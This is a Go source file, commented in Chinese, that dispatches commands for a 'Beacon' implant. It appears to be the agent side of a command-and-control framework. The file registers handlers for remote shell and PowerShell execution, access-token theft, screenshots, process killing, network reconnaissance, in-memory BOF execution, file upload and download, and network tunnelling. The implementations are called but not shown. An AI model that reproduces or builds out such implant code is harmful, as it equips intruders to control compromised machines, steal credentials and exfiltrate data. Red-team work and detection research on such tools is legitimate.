// Package command 实现 Beacon 的所有内置命令（进程、文件、网络、隧道、传输等）。
package command

import (
	"beacon/pkg/jobs"
	"beacon/pkg/utils/packet"
	"fmt"
)

// 指令 ID 定义 (对齐最新规范)
const (
	CommandSleep        uint32 = 1
	CommandExit         uint32 = 2
	CommandShell        uint32 = 10
	CommandPowerShell   uint32 = 11
	CommandCd           uint32 = 20
	CommandLs           uint32 = 21
	CommandPwd          uint32 = 22
	CommandCat          uint32 = 23
	CommandMkdir        uint32 = 24
	CommandRm           uint32 = 25
	CommandMv           uint32 = 26
	CommandCp           uint32 = 27
	CommandPs           uint32 = 40
	CommandKillJob      uint32 = 41
	CommandKill         uint32 = 42
	CommandStealToken   uint32 = 43
	CommandJobs         uint32 = 44
	CommandDownload     uint32 = 28
	CommandUpload       uint32 = 29
	CommandFileBrowser  uint32 = 30
	CommandSetAttr      uint32 = 31
	CommandZip          uint32 = 32
	CommandScreenshot   uint32 = 51
	CommandNetInfo      uint32 = 52
	CommandNetstat      uint32 = 53
	CommandExecutionBOF uint32 = 70

	CommandWhoami uint32 = 50

	// 隧道指令 (60-63)
	CommandTunnelStart   uint32 = 60
	CommandTunnelControl uint32 = 61
	CommandTunnelData    uint32 = 62
	CommandTunnelClose   uint32 = 63
)

// Command 定义了所有可执行命令的接口。
type Command interface {
	Execute(parser *packet.Parser, acp int) ([][]byte, error)
}

// Handler 负责根据命令 ID 分派命令。
type Handler struct {
	commands   map[uint32]Command
	ACP        int
	BeaconID   uint32
	SessionKey []byte
	Jobs       *jobs.Manager
	resultSink func([]byte)
}

// NewHandler 创建命令处理器，注册所有内置命令并启动后台清理。
func NewHandler(acp int) *Handler {
	h := &Handler{
		commands: make(map[uint32]Command),
		ACP:      acp,
		Jobs:     jobs.NewManager(),
	}
	// 通用控制
	h.Register(CommandSleep, &SleepCommand{})
	h.Register(CommandExit, &ExitCommand{})

	// 基础执行
	h.Register(CommandShell, &ShellCommand{})
	h.Register(CommandPowerShell, &PowerShellCommand{})

	// 文件系统
	h.Register(CommandCd, &CdCommand{})
	h.Register(CommandLs, &LsCommand{})
	h.Register(CommandPwd, &PwdCommand{})
	h.Register(CommandCat, &CatCommand{})
	h.Register(CommandMkdir, &MkdirCommand{})
	h.Register(CommandRm, &RmCommand{})
	h.Register(CommandMv, &MvCommand{})
	h.Register(CommandCp, &CpCommand{})
	h.Register(CommandFileBrowser, &FileBrowserCommand{})
	h.Register(CommandSetAttr, &SetAttrCommand{})
	h.Register(CommandZip, &ZipCommand{})
	h.Register(CommandScreenshot, &ScreenshotCommand{})
	h.Register(CommandExecutionBOF, &BOFCommand{})

	// 进程管理
	h.Register(CommandPs, &PsCommand{})
	h.Register(CommandKillJob, &KillJobCommand{})
	h.Register(CommandKill, &KillCommand{})
	h.Register(CommandStealToken, &StealTokenCommand{})
	h.Register(CommandJobs, &JobsCommand{})

	// 探测与信息收集
	h.Register(CommandWhoami, &WhoamiCommand{})
	h.Register(CommandNetInfo, &NetInfoCommand{})
	h.Register(CommandNetstat, &NetstatCommand{})

	// 数据传输
	h.Register(CommandDownload, &DownloadCommand{})
	h.Register(CommandUpload, &UploadCommand{})

	// 隧道协议
	h.Register(CommandTunnelStart, &TunnelStartCommand{})
	h.Register(CommandTunnelControl, &TunnelControlCommand{})
	h.Register(CommandTunnelData, &TunnelDataCommand{})
	h.Register(CommandTunnelClose, &TunnelControlCommand{Action: "close"})

	// 启动后台清理
	StartTunnelJanitor()

	return h
}

// SetID 设置 BeaconID 和 SessionKey，同步更新需要它们的命令（如隧道）。
func (h *Handler) SetID(beaconID uint32, sessionKey []byte) {
	h.BeaconID = beaconID
	h.SessionKey = sessionKey
	// 更新已经注册的 TunnelStartCommand (如果它需要的话)
	if cmd, ok := h.commands[CommandTunnelStart].(*TunnelStartCommand); ok {
		cmd.BeaconID = beaconID
		cmd.SessionKey = sessionKey
	}
}

// SetResultSink 设置结果回传回调（用于 Shell/BOF 等后台任务实时输出）。
func (h *Handler) SetResultSink(sink func([]byte)) {
	h.resultSink = sink
}

// Close 释放 Handler 持有的资源（主要是 Job Manager）。
func (h *Handler) Close() {
	if h != nil && h.Jobs != nil {
		h.Jobs.Close()
	}
}

// Register 注册一个命令 ID 到 Command 实现的映射。
func (h *Handler) Register(id uint32, cmd Command) {
	h.commands[id] = cmd
}

// Handle 根据 commandId 分派命令执行。部分命令（Download/Upload/Shell/BOF/隧道）有特殊处理路径。
func (h *Handler) Handle(taskId uint32, commandId uint32, data []byte) ([][]byte, error) {
	cmd, ok := h.commands[commandId]
	if !ok {
		return nil, fmt.Errorf("command id %d not registered", commandId)
	}

	parser := packet.CreateParser(data)

	// 下载指令特殊处理：需要 taskId 组包
	if commandId == CommandDownload {
		return Download(parser, taskId, h.ACP)
	}
	if commandId == CommandUpload {
		res, err := Upload(parser, taskId, h.ACP)
		return [][]byte{res}, err
	}
	if commandId == CommandTunnelStart {
		return StartTunnelTask(taskId, parser, h.ACP)
	}
	if commandId == CommandShell {
		res, err := StartShellJob(h.Jobs, h.resultSink, taskId, commandId, parser, h.ACP, false)
		return [][]byte{res}, err
	}
	if commandId == CommandPowerShell {
		res, err := StartShellJob(h.Jobs, h.resultSink, taskId, commandId, parser, h.ACP, true)
		return [][]byte{res}, err
	}
	if commandId == CommandExecutionBOF {
		res, err := StartBOFJob(h.Jobs, h.resultSink, taskId, commandId, parser, h.ACP)
		return [][]byte{res}, err
	}
	if commandId == CommandJobs {
		res, err := Jobs(h.Jobs)
		return [][]byte{res}, err
	}
	if commandId == CommandKillJob {
		res, err := KillJob(h.Jobs, parser)
		return [][]byte{res}, err
	}

	// 直接调用 cmd_Execute
	return cmd.Execute(parser, h.ACP)
}

// GetPendingDownloadPackets 获取文件下载的挂起数据包（每次心跳调用）。
func (h *Handler) GetPendingDownloadPackets() [][]byte {
	return GetPendingDownloadPackets()
}

// GetPendingTunnelPackets 获取隧道转发的挂起数据包（每次心跳调用）。
func (h *Handler) GetPendingTunnelPackets() [][]byte {
	return tunnelRuntime.GetPendingPackets()
}

// ---------------------------------------------------------------------------
// 指令结构体定义
// 每个结构体实现 Command 接口，将 Execute 委托给对应的顶层函数。
// ---------------------------------------------------------------------------

// SleepCommand 调整 Beacon 休眠时间和抖动比例。
type SleepCommand struct{}

func (s *SleepCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	res, err := Sleep(p)
	return [][]byte{res}, err
}

// ExitCommand 请求 Beacon 退出。
type ExitCommand struct{}

func (e *ExitCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	res, err := Exit(p)
	return [][]byte{res}, err
}

// ShellCommand 执行系统 Shell 命令（后台 Job）。
type ShellCommand struct{}

func (s *ShellCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	res, err := Shell(p, acp)
	return [][]byte{res}, err
}

// PowerShellCommand 执行 PowerShell 命令（后台 Job）。
type PowerShellCommand struct{}

func (ps *PowerShellCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	res, err := PowerShell(p, acp)
	return [][]byte{res}, err
}

// CdCommand 切换工作目录。
type CdCommand struct{}

func (c *CdCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	res, err := Cd(p, acp)
	return [][]byte{res}, err
}

// LsCommand 列出目录内容。
type LsCommand struct{}

func (l *LsCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	res, err := Ls(p, acp)
	return [][]byte{res}, err
}

// PwdCommand 获取当前工作目录。
type PwdCommand struct{}

func (p *PwdCommand) Execute(pr *packet.Parser, acp int) ([][]byte, error) {
	res, err := Pwd(pr)
	return [][]byte{res}, err
}

// CatCommand 读取文件内容。
type CatCommand struct{}

func (c *CatCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	res, err := Cat(p, acp)
	return [][]byte{res}, err
}

// MkdirCommand 创建目录。
type MkdirCommand struct{}

func (m *MkdirCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	res, err := Mkdir(p, acp)
	return [][]byte{res}, err
}

// RmCommand 删除文件或目录。
type RmCommand struct{}

func (r *RmCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	res, err := Rm(p, acp)
	return [][]byte{res}, err
}

// MvCommand 移动/重命名文件或目录。
type MvCommand struct{}

func (m *MvCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	res, err := Mv(p, acp)
	return [][]byte{res}, err
}

// CpCommand 复制文件或目录。
type CpCommand struct{}

func (c *CpCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	res, err := Cp(p, acp)
	return [][]byte{res}, err
}

// FileBrowserCommand 文件浏览器（递归列出目录树）。
type FileBrowserCommand struct{}

func (f *FileBrowserCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	res, err := FileBrowser(p, acp)
	return [][]byte{res}, err
}

// SetAttrCommand 设置文件属性（隐藏、只读等）。
type SetAttrCommand struct{}

func (s *SetAttrCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	res, err := SetAttr(p, acp)
	return [][]byte{res}, err
}

// ZipCommand 压缩文件/目录为 ZIP 归档。
type ZipCommand struct{}

func (z *ZipCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	res, err := Zip(p, acp)
	return [][]byte{res}, err
}

// ScreenshotCommand 截取屏幕截图。
type ScreenshotCommand struct{}

func (sc *ScreenshotCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	res, err := Screenshot(p)
	return [][]byte{res}, err
}

// PsCommand 列出系统进程。
type PsCommand struct{}

func (ps *PsCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	res, err := Ps(p, acp)
	return [][]byte{res}, err
}

// KillJobCommand 终止后台 Job（特殊分派）。
type KillJobCommand struct{}

func (k *KillJobCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	return nil, fmt.Errorf("KillJob command should be handled specially in Handler")
}

// JobsCommand 列出后台 Job（特殊分派）。
type JobsCommand struct{}

func (j *JobsCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	return nil, fmt.Errorf("Jobs command should be handled specially in Handler")
}

// KillCommand 终止指定进程。
type KillCommand struct{}

func (k *KillCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	res, err := Kill(p)
	return [][]byte{res}, err
}

// StealTokenCommand 窃取目标进程的访问令牌（仅 Windows）。
type StealTokenCommand struct{}

func (s *StealTokenCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	res, err := StealToken(p)
	return [][]byte{res}, err
}

// WhoamiCommand 获取当前用户身份信息。
type WhoamiCommand struct{}

func (w *WhoamiCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	res, err := Whoami(p)
	return [][]byte{res}, err
}

// NetInfoCommand 获取网络接口信息。
type NetInfoCommand struct{}

func (n *NetInfoCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	res, err := NetInfo(p)
	return [][]byte{res}, err
}

// NetstatCommand 获取网络连接列表。
type NetstatCommand struct{}

func (n *NetstatCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	res, err := Netstat(p)
	return [][]byte{res}, err
}

// DownloadCommand 文件下载（特殊分派，需要 taskId 组包）。
type DownloadCommand struct{}

func (d *DownloadCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	return nil, fmt.Errorf("Download command should be handled specially in Handler")
}

// UploadCommand 文件上传（特殊分派）。
type UploadCommand struct{}

func (u *UploadCommand) Execute(p *packet.Parser, acp int) ([][]byte, error) {
	return nil, fmt.Errorf("Upload command should be handled specially in Handler")
}
